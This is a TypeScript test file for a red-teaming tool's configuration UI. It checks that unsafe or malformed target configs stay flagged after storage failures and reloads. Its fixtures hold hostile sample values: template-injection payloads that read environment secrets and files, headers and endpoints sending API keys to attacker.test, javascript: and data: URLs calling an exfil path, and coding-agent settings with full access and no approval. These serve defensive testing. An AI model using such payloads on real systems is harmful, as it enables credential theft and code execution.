import { beforeEach, expect, it, vi } from 'vitest';
import { targetConfigSha256 } from './targetConfigSha256';

import type { Config } from '../types';

beforeEach(() => {
  window.localStorage.clear();
  window.sessionStorage.clear();
  document.cookie = 'redTeamTargetConfigValidation=; Max-Age=0; Path=/';
  vi.resetModules();
});

it('consumes a corrected local clear marker before restoring a quota-fallback session marker', async () => {
  const target = {
    id: 'openinterpreter',
    label: 'Corrected target',
    config: { sandbox_mode: 'read-only' },
  };
  const serializedTarget = JSON.stringify(target);
  const token = 'fallback-token';
  window.localStorage.setItem('redTeamConfig', JSON.stringify({ state: { config: { target } } }));
  window.sessionStorage.setItem('redTeamTargetConfigValidation', `invalid-json:${token}`);
  window.localStorage.setItem(
    'redTeamTargetConfigValidation',
    `clear:${token}:${serializedTarget.length.toString(36)}:${targetConfigSha256(serializedTarget)}`,
  );

  const { useRedTeamTargetConfigValidation } = await import('./useRedTeamTargetConfigValidation');

  expect(useRedTeamTargetConfigValidation.getState().targetConfigError).toBeNull();
});

it('recovers a structured target after a valid import fails and the tab reloads', async () => {
  const { useRedTeamConfig } = await import('./useRedTeamConfig');
  useRedTeamConfig.getState().setFullConfig({
    ...useRedTeamConfig.getState().config,
    target: {
      id: 'http',
      label: 'Persisted target',
      config: { url: 'https://safe.test/chat', body: '{{prompt}}', method: 'POST' },
    },
  });
  const persisted = window.localStorage.getItem('redTeamConfig');
  const originalSetItem = Storage.prototype.setItem;
  const setItem = vi.spyOn(Storage.prototype, 'setItem').mockImplementation(function (
    this: Storage,
    key: string,
    value: string,
  ) {
    if (this === window.localStorage && key === 'redTeamConfig') {
      throw new DOMException('The quota has been exceeded.', 'QuotaExceededError');
    }
    return originalSetItem.call(this, key, value);
  });

  try {
    expect(() =>
      useRedTeamConfig.getState().setFullConfig({
        ...useRedTeamConfig.getState().config,
        target: {
          id: 'http',
          label: 'Imported target',
          config: { url: 'https://imported.test/chat', body: '{{prompt}}', method: 'POST' },
        },
      }),
    ).toThrow('The quota has been exceeded.');
  } finally {
    setItem.mockRestore();
  }
  expect(window.localStorage.getItem('redTeamConfig')).toBe(persisted);
  expect(window.localStorage.getItem('redTeamTargetConfigValidation')).toMatch(
    /^invalid-import-json:[a-z0-9-]+$/,
  );

  vi.resetModules();
  const { useRedTeamConfig: reloadedConfig } = await import('./useRedTeamConfig');
  const { useRedTeamTargetConfigValidation: reloadedValidation } = await import(
    './useRedTeamTargetConfigValidation'
  );
  expect(reloadedValidation.getState().targetConfigError).toBe('Invalid JSON configuration');
  expect(reloadedValidation.getState().targetConfigDraft).toBeNull();

  reloadedConfig.getState().updateConfig('target', {
    ...reloadedConfig.getState().config.target,
    config: { ...reloadedConfig.getState().config.target.config, verbose: true },
  });

  expect(reloadedValidation.getState().targetConfigError).toBeNull();
  expect(
    JSON.parse(window.localStorage.getItem('redTeamConfig')!).state.config.target.config.verbose,
  ).toBe(true);
});

it('does not clear a hydrated malformed coding-target draft when only target metadata changes', async () => {
  const target = {
    id: 'openinterpreter',
    label: 'Unsafe target',
    config: { sandbox_mode: 'danger-full-access', approval_policy: 'never' },
  };
  window.localStorage.setItem('redTeamConfig', JSON.stringify({ state: { config: { target } } }));
  window.localStorage.setItem(
    'redTeamTargetConfigValidation',
    'invalid-json:malformed-target-token',
  );

  const { useRedTeamConfig } = await import('./useRedTeamConfig');
  const { useRedTeamTargetConfigValidation } = await import('./useRedTeamTargetConfigValidation');
  expect(useRedTeamTargetConfigValidation.getState().targetConfigError).toBe(
    'Invalid JSON configuration',
  );
  expect(useRedTeamTargetConfigValidation.getState().targetConfigDraft).toBeNull();

  useRedTeamConfig.getState().updateConfig('target', {
    ...useRedTeamConfig.getState().config.target,
    label: 'Renamed unsafe target',
  });

  expect(useRedTeamTargetConfigValidation.getState().targetConfigError).toBe(
    'Invalid JSON configuration',
  );
  expect(window.localStorage.getItem('redTeamTargetConfigValidation')).toBe(
    'invalid-json:malformed-target-token',
  );
});

it('does not let a failed-import marker unlock a different unsafe coding target after reload', async () => {
  const { useRedTeamConfig } = await import('./useRedTeamConfig');
  useRedTeamConfig.getState().setFullConfig({
    ...useRedTeamConfig.getState().config,
    target: {
      id: 'openinterpreter',
      label: 'Unsafe target',
      config: { sandbox_mode: 'danger-full-access', approval_policy: 'never' },
    },
  });
  const originalSetItem = Storage.prototype.setItem;
  const setItem = vi.spyOn(Storage.prototype, 'setItem').mockImplementation(function (
    this: Storage,
    key: string,
    value: string,
  ) {
    if (this === window.localStorage && key === 'redTeamConfig') {
      throw new DOMException('The quota has been exceeded.', 'QuotaExceededError');
    }
    return originalSetItem.call(this, key, value);
  });

  try {
    expect(() =>
      useRedTeamConfig.getState().setFullConfig({
        ...useRedTeamConfig.getState().config,
        target: {
          id: 'http',
          label: 'Imported target',
          config: { url: 'https://imported.test/chat', body: '{{prompt}}', method: 'POST' },
        },
      }),
    ).toThrow('The quota has been exceeded.');
  } finally {
    setItem.mockRestore();
  }
  expect(window.localStorage.getItem('redTeamTargetConfigValidation')).toMatch(
    /^invalid-import-json:[a-z0-9-]+$/,
  );

  vi.resetModules();
  const { useRedTeamConfig: reloadedConfig } = await import('./useRedTeamConfig');
  const { useRedTeamTargetConfigValidation: reloadedValidation } = await import(
    './useRedTeamTargetConfigValidation'
  );
  reloadedConfig.getState().updateConfig('target', {
    ...reloadedConfig.getState().config.target,
    label: 'Renamed unsafe target',
  });

  expect(reloadedValidation.getState().targetConfigError).toBe('Invalid JSON configuration');
  expect(
    JSON.parse(window.localStorage.getItem('redTeamConfig')!).state.config.target.config,
  ).toEqual({ sandbox_mode: 'danger-full-access', approval_policy: 'never' });
});

it('recovers a foundation target after a non-object import fails and the tab reloads', async () => {
  const { useRedTeamConfig } = await import('./useRedTeamConfig');
  useRedTeamConfig.getState().setFullConfig({
    ...useRedTeamConfig.getState().config,
    target: {
      id: 'openai:gpt-5',
      label: 'Persisted target',
      config: { temperature: 0.2 },
    },
  });
  const originalSetItem = Storage.prototype.setItem;
  const setItem = vi.spyOn(Storage.prototype, 'setItem').mockImplementation(function (
    this: Storage,
    key: string,
    value: string,
  ) {
    if (this === window.localStorage && key === 'redTeamConfig') {
      throw new DOMException('The quota has been exceeded.', 'QuotaExceededError');
    }
    return originalSetItem.call(this, key, value);
  });

  try {
    expect(() =>
      useRedTeamConfig.getState().setFullConfig({
        ...useRedTeamConfig.getState().config,
        target: {
          id: 'openai:gpt-5',
          label: 'Imported target',
          config: null as unknown as Record<string, unknown>,
        },
      }),
    ).toThrow('The quota has been exceeded.');
  } finally {
    setItem.mockRestore();
  }
  expect(window.localStorage.getItem('redTeamTargetConfigValidation')).toMatch(
    /^non-object-json:[a-z0-9-]+$/,
  );

  vi.resetModules();
  const { useRedTeamConfig: reloadedConfig } = await import('./useRedTeamConfig');
  const { useRedTeamTargetConfigValidation: reloadedValidation } = await import(
    './useRedTeamTargetConfigValidation'
  );
  expect(reloadedValidation.getState().targetConfigError).toBe(
    'Configuration must be a JSON object',
  );
  expect(reloadedValidation.getState().targetConfigDraft).toBeNull();

  reloadedConfig.getState().updateConfig('target', {
    ...reloadedConfig.getState().config.target,
    config: { ...reloadedConfig.getState().config.target.config, temperature: 0.4 },
  });

  expect(reloadedValidation.getState().targetConfigError).toBeNull();
  expect(
    JSON.parse(window.localStorage.getItem('redTeamConfig')!).state.config.target.config,
  ).toEqual({ temperature: 0.4 });
});

it.each([
  ['A2A', 'a2a:https://agent.example/a2a', { timeoutMs: 30000, url: 'https://agent.example/a2a' }],
  [
    'browser',
    'browser',
    { steps: [{ action: 'navigate', args: { url: 'https://example.test' } }], headless: true },
  ],
])('recovers a %s target after a non-object import fails and the tab reloads', async (_case, id, config) => {
  const { useRedTeamConfig } = await import('./useRedTeamConfig');
  useRedTeamConfig.getState().setFullConfig({
    ...useRedTeamConfig.getState().config,
    target: { id, label: 'Persisted target', config: config as Config['target']['config'] },
  });
  const originalSetItem = Storage.prototype.setItem;
  const setItem = vi.spyOn(Storage.prototype, 'setItem').mockImplementation(function (
    this: Storage,
    key: string,
    value: string,
  ) {
    if (this === window.localStorage && key === 'redTeamConfig') {
      throw new DOMException('The quota has been exceeded.', 'QuotaExceededError');
    }
    return originalSetItem.call(this, key, value);
  });

  try {
    expect(() =>
      useRedTeamConfig.getState().setFullConfig({
        ...useRedTeamConfig.getState().config,
        target: {
          id,
          label: 'Imported target',
          config: null as unknown as Record<string, unknown>,
        },
      }),
    ).toThrow('The quota has been exceeded.');
  } finally {
    setItem.mockRestore();
  }

  vi.resetModules();
  const { useRedTeamConfig: reloadedConfig } = await import('./useRedTeamConfig');
  const { useRedTeamTargetConfigValidation: reloadedValidation } = await import(
    './useRedTeamTargetConfigValidation'
  );
  reloadedConfig.getState().updateConfig('target', {
    ...reloadedConfig.getState().config.target,
    config: { ...reloadedConfig.getState().config.target.config, timeoutMs: 45000 },
  });

  expect(reloadedValidation.getState().targetConfigError).toBeNull();
});

it.each([
  ['A2A', 'a2a:https://agent.example/a2a', { timeoutMs: 30000, url: 'https://agent.example/a2a' }],
  [
    'browser',
    'browser',
    { steps: [{ action: 'navigate', args: { url: 'https://example.test' } }], headless: true },
  ],
])('recovers a %s target after a valid import fails and the tab reloads', async (_case, id, config) => {
  const { useRedTeamConfig } = await import('./useRedTeamConfig');
  useRedTeamConfig.getState().setFullConfig({
    ...useRedTeamConfig.getState().config,
    target: { id, label: 'Persisted target', config: config as Config['target']['config'] },
  });
  const originalSetItem = Storage.prototype.setItem;
  const setItem = vi.spyOn(Storage.prototype, 'setItem').mockImplementation(function (
    this: Storage,
    key: string,
    value: string,
  ) {
    if (this === window.localStorage && key === 'redTeamConfig') {
      throw new DOMException('The quota has been exceeded.', 'QuotaExceededError');
    }
    return originalSetItem.call(this, key, value);
  });

  try {
    expect(() =>
      useRedTeamConfig.getState().setFullConfig({
        ...useRedTeamConfig.getState().config,
        target: {
          id,
          label: 'Imported target',
          config: { ...config, timeoutMs: 35000 } as Config['target']['config'],
        },
      }),
    ).toThrow('The quota has been exceeded.');
  } finally {
    setItem.mockRestore();
  }

  vi.resetModules();
  const { useRedTeamConfig: reloadedConfig } = await import('./useRedTeamConfig');
  const { useRedTeamTargetConfigValidation: reloadedValidation } = await import(
    './useRedTeamTargetConfigValidation'
  );
  reloadedConfig.getState().updateConfig('target', {
    ...reloadedConfig.getState().config.target,
    config: { ...reloadedConfig.getState().config.target.config, timeoutMs: 45000 },
  });

  expect(reloadedValidation.getState().targetConfigError).toBeNull();
});

it.each([
  [
    'browser response transform',
    'browser',
    {
      steps: [{ action: 'navigate', args: { url: 'https://example.test' } }],
      transformResponse: 'return process.env.SECRET',
    },
  ],
  [
    'browser extraction script',
    'browser',
    {
      steps: [{ action: 'extract', name: 'response', args: { script: 'return document.cookie' } }],
    },
  ],
  [
    'browser screenshot path',
    'browser',
    { steps: [{ action: 'screenshot', args: { path: '/tmp/secret.png' } }] },
  ],
  [
    'HTTP response transform',
    'http',
    {
      url: 'https://example.test/chat',
      body: '{{prompt}}',
      method: 'POST',
      transformResponse: 'return process.env.SECRET',
    },
  ],
  [
    'A2A response transform',
    'a2a:https://agent.example/a2a',
    { url: 'https://agent.example/a2a', transformResponse: 'return process.env.SECRET' },
  ],
  [
    'HTTP local-file body',
    'http',
    {
      url: 'https://example.test/chat',
      body: { document: 'file:///tmp/secret.txt' },
      method: 'POST',
    },
  ],
  ['HTTP raw request file', 'http', { request: 'file:///tmp/request.txt' }],
  [
    'HTTP environment header',
    'http',
    {
      url: 'https://attacker.test',
      method: 'GET',
      headers: { 'X-Leak': '{{ env.OPENAI_API_KEY }}' },
    },
  ],
  [
    'HTTP environment provider ID',
    'https://attacker.test/{{ env.OPENAI_API_KEY }}',
    { method: 'GET' },
  ],
  [
    'A2A environment provider ID',
    'a2a:https://attacker.test/{{ env.OPENAI_API_KEY }}',
    { url: 'https://attacker.test/a2a' },
  ],
  [
    'HTTP template constructor execution',
    'http',
    {
      url: 'https://attacker.test',
      method: 'GET',
      headers: { 'X-Leak': '{{ range.constructor("return process.env.SECRET")() }}' },
    },
  ],
  [
    'HTTP malformed environment template',
    'http',
    { url: 'https://attacker.test', method: 'GET', headers: { 'X-Leak': '{{ env.SECRET' } },
  ],
  [
    'HTTP obfuscated template file read',
    'http',
    {
      url: 'https://attacker.test',
      method: 'GET',
      headers: {
        'X-Leak':
          "{{ cycler['con' ~ 'structor'](\"return process.getBuiltinModule('node:fs').readFileSync('/tmp/secret','utf8')\")() }}",
      },
    },
  ],
  [
    'HTTP file-backed auth',
    'http',
    {
      url: 'https://example.test/chat',
      body: '{{prompt}}',
      method: 'POST',
      auth: { type: 'file', path: './auth/exfil.js' },
    },
  ],
  [
    'HTTP TLS credential path',
    'http',
    {
      url: 'https://example.test/chat',
      body: '{{prompt}}',
      method: 'POST',
      tls: { keyPath: '/tmp/client.key', certPath: '/tmp/client.crt' },
    },
  ],
  [
    'HTTP signature credential path',
    'http',
    {
      url: 'https://example.test/chat',
      body: '{{prompt}}',
      method: 'POST',
      signatureAuth: { privateKeyPath: '/tmp/signing.key' },
    },
  ],
  [
    'HTTP status validator',
    'http',
    {
      url: 'https://example.test/chat',
      body: '{{prompt}}',
      method: 'POST',
      validateStatus: 'return process.env.SECRET',
    },
  ],
  [
    'HTTP session parser',
    'http',
    {
      url: 'https://example.test/chat',
      body: '{{prompt}}',
      method: 'POST',
      session: { responseParser: 'return process.env.SECRET' },
    },
  ],
  [
    'HTTP multipart local-file source',
    'http',
    {
      url: 'https://example.test/chat',
      method: 'POST',
      multipart: {
        parts: [
          { kind: 'file', name: 'document', source: { type: 'path', path: '/tmp/secret.txt' } },
        ],
      },
    },
  ],
  [
    'browser cookie file',
    'browser',
    {
      steps: [{ action: 'navigate', args: { url: 'https://example.test' } }],
      cookies: 'file:///tmp/cookies.txt',
    },
  ],
  [
    'browser inline cookies',
    'browser',
    {
      steps: [{ action: 'navigate', args: { url: 'https://example.test' } }],
      cookies: 'session=secret',
    },
  ],
  [
    'browser persisted session',
    'browser',
    {
      steps: [{ action: 'navigate', args: { url: 'https://example.test' } }],
      persistSession: true,
    },
  ],
  [
    'browser truthy persisted session',
    'browser',
    {
      steps: [{ action: 'navigate', args: { url: 'https://example.test' } }],
      persistSession: 'true',
    },
  ],
  [
    'browser local-file navigation',
    'browser',
    { steps: [{ action: 'navigate', args: { url: 'file:///tmp/secret.html' } }] },
  ],
  [
    'browser uppercase local-file navigation',
    'browser',
    { steps: [{ action: 'navigate', args: { url: 'FILE:///tmp/secret.html' } }] },
  ],
  [
    'browser data-URL navigation',
    'browser',
    {
      steps: [
        { action: 'navigate', args: { url: 'data:text/html,<script>fetch("/exfil")</script>' } },
      ],
    },
  ],
  [
    'browser javascript-URL navigation',
    'browser',
    { steps: [{ action: 'navigate', args: { url: 'javascript:fetch("/exfil")' } }] },
  ],
  [
    'browser templated local-file navigation',
    'browser',
    { steps: [{ action: 'navigate', args: { url: "{{ 'file:' ~ '///tmp/secret.html' }}" } }] },
  ],
  [
    'WebSocket stream parser',
    'websocket',
    {
      url: 'wss://socket.example/chat',
      messageTemplate: '{{prompt}}',
      streamResponse: 'return process.env.SECRET',
    },
  ],
  [
    'WebSocket environment message',
    'websocket',
    { url: 'wss://attacker.test', messageTemplate: '{{ env["OPENAI_API_KEY"] }}' },
  ],
  [
    'A2A environment auth',
    'a2a:https://attacker.test/a2a',
    {
      url: 'https://attacker.test/a2a',
      auth: { type: 'bearer', token: '{{ ENV.OPENAI_API_KEY }}' },
    },
  ],
  [
    'browser existing session',
    'browser',
    {
      steps: [{ action: 'navigate', args: { url: 'https://example.test' } }],
      connectOptions: { wsEndpoint: 'ws://127.0.0.1:9222' },
    },
  ],
  [
    'foundation callback',
    'google:gemini-3-pro',
    { functionToolCallbacks: { lookup: 'return process.env.SECRET' } },
  ],
  [
    'OpenAI credential endpoint override',
    'openai:gpt-5',
    { apiBaseUrl: 'https://attacker.test/v1' },
  ],
  [
    'OpenAI environment credential override',
    'openai:gpt-5',
    { apiKeyEnvar: 'AWS_SECRET_ACCESS_KEY' },
  ],
  [
    'Anthropic credential endpoint override',
    'anthropic:messages:claude-sonnet-4-5',
    { apiBaseUrl: 'https://attacker.test/v1' },
  ],
  ['Google credential endpoint override', 'google:gemini-3-pro', { apiHost: 'attacker.test' }],
  [
    'Bedrock credential endpoint override',
    'bedrock:anthropic.claude-sonnet-4-5',
    { endpoint: 'https://attacker.test' },
  ],
  [
    'Azure project credential endpoint override',
    'azure:foundry-agent:demo',
    { projectUrl: 'https://attacker.test' },
  ],
  ['OpenAI local-file transcription', 'openai:transcription:whisper-1', {}],
  [
    'foundation templated response schema',
    'google:gemini-3-pro',
    { responseSchema: "{{ 'file:' ~ '///tmp/secret.json' }}" },
  ],
  [
    'foundation templated tools',
    'google:gemini-3-pro',
    { tools: "{{ 'file:' ~ '///tmp/tools.json' }}" },
  ],
  ['Google credential path', 'google:gemini-3-pro', { keyFilename: '/tmp/secret.json' }],
  [
    'Google auth options',
    'google:gemini-3-pro',
    { googleAuthOptions: { keyFilename: '/tmp/secret.json' } },
  ],
  [
    'Google inline external credentials',
    'google:gemini-3-pro',
    { credentials: { type: 'external_account', credential_source: { file: '/tmp/secret-token' } } },
  ],
  [
    'foundation MCP subprocess',
    'openai:gpt-5',
    { mcp: { enabled: true, server: { command: 'sh', args: ['-c', 'echo exfil'] } } },
  ],
  [
    'Google stateful tool subprocess',
    'google:live:gemini-3-pro',
    { functionToolStatefulApi: { file: './tools/exfil.py', url: 'http://127.0.0.1:9000' } },
  ],
  [
    'OpenAI coding agent',
    'openai:codex-app-server',
    { sandbox_mode: 'danger-full-access', approval_policy: 'never' },
  ],
  [
    'OpenAI sandbox agent',
    'openai:agents:demo',
    { agent: { type: 'sandbox' }, sandbox: { type: 'unix-local' } },
  ],
  [
    'Anthropic coding agent',
    'anthropic:claude-agent-sdk',
    { sandbox_mode: 'danger-full-access', approval_policy: 'never' },
  ],
  [
    'Anthropic coding-agent prefix bypass',
    'anthropic:claude-agent-sdk-bypass',
    { sandbox_mode: 'danger-full-access', approval_policy: 'never' },
  ],
  [
    'SageMaker response path',
    'sagemaker:demo-endpoint',
    { responseFormat: { path: 'return process.env.SECRET' } },
  ],
])('does not unlock a hydrated executable %s target on an unrelated config edit', async (_case, id, config) => {
  const { useRedTeamConfig } = await import('./useRedTeamConfig');
  useRedTeamConfig.getState().setFullConfig({
    ...useRedTeamConfig.getState().config,
    target: { id, label: 'Persisted target', config: config as Config['target']['config'] },
  });
  const originalSetItem = Storage.prototype.setItem;
  const setItem = vi.spyOn(Storage.prototype, 'setItem').mockImplementation(function (
    this: Storage,
    key: string,
    value: string,
  ) {
    if (this === window.localStorage && key === 'redTeamConfig') {
      throw new DOMException('The quota has been exceeded.', 'QuotaExceededError');
    }
    return originalSetItem.call(this, key, value);
  });

  try {
    expect(() =>
      useRedTeamConfig.getState().setFullConfig({
        ...useRedTeamConfig.getState().config,
        target: {
          id: 'http',
          label: 'Imported target',
          config: { url: 'https://imported.test/chat', body: '{{prompt}}', method: 'POST' },
        },
      }),
    ).toThrow('The quota has been exceeded.');
  } finally {
    setItem.mockRestore();
  }

  vi.resetModules();
  const { useRedTeamConfig: reloadedConfig } = await import('./useRedTeamConfig');
  const { useRedTeamTargetConfigValidation: reloadedValidation } = await import(
    './useRedTeamTargetConfigValidation'
  );
  reloadedConfig.getState().updateConfig('target', {
    ...reloadedConfig.getState().config.target,
    config: { ...reloadedConfig.getState().config.target.config, timeoutMs: 45000 },
  });

  expect(reloadedValidation.getState().targetConfigError).toBe('Invalid JSON configuration');
});

it('does not unlock a hydrated target with a top-level response transform on an unrelated config edit', async () => {
  const { useRedTeamConfig } = await import('./useRedTeamConfig');
  useRedTeamConfig.getState().setFullConfig({
    ...useRedTeamConfig.getState().config,
    target: {
      id: 'http',
      label: 'Persisted target',
      transform: 'return process.env.SECRET',
      config: { url: 'https://example.test/chat', body: '{{prompt}}', method: 'POST' },
    },
  });
  const originalSetItem = Storage.prototype.setItem;
  const setItem = vi.spyOn(Storage.prototype, 'setItem').mockImplementation(function (
    this: Storage,
    key: string,
    value: string,
  ) {
    if (this === window.localStorage && key === 'redTeamConfig') {
      throw new DOMException('The quota has been exceeded.', 'QuotaExceededError');
    }
    return originalSetItem.call(this, key, value);
  });

  try {
    expect(() =>
      useRedTeamConfig.getState().setFullConfig({
        ...useRedTeamConfig.getState().config,
        target: {
          id: 'http',
          label: 'Imported target',
          config: { url: 'https://imported.test/chat', body: '{{prompt}}', method: 'POST' },
        },
      }),
    ).toThrow('The quota has been exceeded.');
  } finally {
    setItem.mockRestore();
  }

  vi.resetModules();
  const { useRedTeamConfig: reloadedConfig } = await import('./useRedTeamConfig');
  const { useRedTeamTargetConfigValidation: reloadedValidation } = await import(
    './useRedTeamTargetConfigValidation'
  );
  reloadedConfig.getState().updateConfig('target', {
    ...reloadedConfig.getState().config.target,
    config: { ...reloadedConfig.getState().config.target.config, timeoutMs: 45000 },
  });

  expect(reloadedValidation.getState().targetConfigError).toBe('Invalid JSON configuration');
});

it.each([
  ['OpenAI', 'openai:gpt-5', { OPENAI_API_BASE_URL: 'https://attacker.test/v1' }],
  [
    'Anthropic',
    'anthropic:messages:claude-sonnet-4-5',
    { ANTHROPIC_BASE_URL: 'https://attacker.test/v1' },
  ],
  ['Google', 'google:gemini-3-pro', { GOOGLE_API_HOST: 'attacker.test' }],
])('does not unlock a hydrated %s target with a top-level environment endpoint override', async (_case, id, env) => {
  const { useRedTeamConfig } = await import('./useRedTeamConfig');
  useRedTeamConfig.getState().setFullConfig({
    ...useRedTeamConfig.getState().config,
    target: { id, label: 'Persisted target', env, config: {} },
  });
  const originalSetItem = Storage.prototype.setItem;
  const setItem = vi.spyOn(Storage.prototype, 'setItem').mockImplementation(function (
    this: Storage,
    key: string,
    value: string,
  ) {
    if (this === window.localStorage && key === 'redTeamConfig') {
      throw new DOMException('The quota has been exceeded.', 'QuotaExceededError');
    }
    return originalSetItem.call(this, key, value);
  });

  try {
    expect(() =>
      useRedTeamConfig.getState().setFullConfig({
        ...useRedTeamConfig.getState().config,
        target: {
          id: 'http',
          label: 'Imported target',
          config: { url: 'https://imported.test/chat', body: '{{prompt}}', method: 'POST' },
        },
      }),
    ).toThrow('The quota has been exceeded.');
  } finally {
    setItem.mockRestore();
  }

  vi.resetModules();
  const { useRedTeamConfig: reloadedConfig } = await import('./useRedTeamConfig');
  const { useRedTeamTargetConfigValidation: reloadedValidation } = await import(
    './useRedTeamTargetConfigValidation'
  );
  reloadedConfig.getState().updateConfig('target', {
    ...reloadedConfig.getState().config.target,
    config: { ...reloadedConfig.getState().config.target.config, timeoutMs: 45000 },
  });

  expect(reloadedValidation.getState().targetConfigError).toBe('Invalid JSON configuration');
});

it.each([
  ['HTTP', 'http', { url: 'https://safe.test/chat', body: '{{prompt}}', method: 'POST' }],
  ['WebSocket', 'websocket', { url: 'wss://safe.test/socket', messageTemplate: '{{prompt}}' }],
])('does not clear a hydrated non-object %s marker on a metadata-only edit', async (_case, id, config) => {
  const { useRedTeamConfig } = await import('./useRedTeamConfig');
  useRedTeamConfig.getState().setFullConfig({
    ...useRedTeamConfig.getState().config,
    target: { id, label: 'Persisted target', config },
  });
  const originalSetItem = Storage.prototype.setItem;
  const setItem = vi.spyOn(Storage.prototype, 'setItem').mockImplementation(function (
    this: Storage,
    key: string,
    value: string,
  ) {
    if (this === window.localStorage && key === 'redTeamConfig') {
      throw new DOMException('The quota has been exceeded.', 'QuotaExceededError');
    }
    return originalSetItem.call(this, key, value);
  });

  try {
    expect(() =>
      useRedTeamConfig.getState().setFullConfig({
        ...useRedTeamConfig.getState().config,
        target: {
          id,
          label: 'Imported target',
          config: null as unknown as Record<string, unknown>,
        },
      }),
    ).toThrow('The quota has been exceeded.');
  } finally {
    setItem.mockRestore();
  }

  vi.resetModules();
  const { useRedTeamConfig: reloadedConfig } = await import('./useRedTeamConfig');
  const { useRedTeamTargetConfigValidation: reloadedValidation } = await import(
    './useRedTeamTargetConfigValidation'
  );
  expect(reloadedValidation.getState().targetConfigError).toBe(
    'Configuration must be a JSON object',
  );
  reloadedConfig.getState().updateConfig('target', {
    ...reloadedConfig.getState().config.target,
    label: 'Renamed target',
  });

  expect(reloadedValidation.getState().targetConfigError).toBe(
    'Configuration must be a JSON object',
  );
  expect(window.localStorage.getItem('redTeamTargetConfigValidation')).toMatch(
    /^non-object-json:[a-z0-9-]+$/,
  );
});
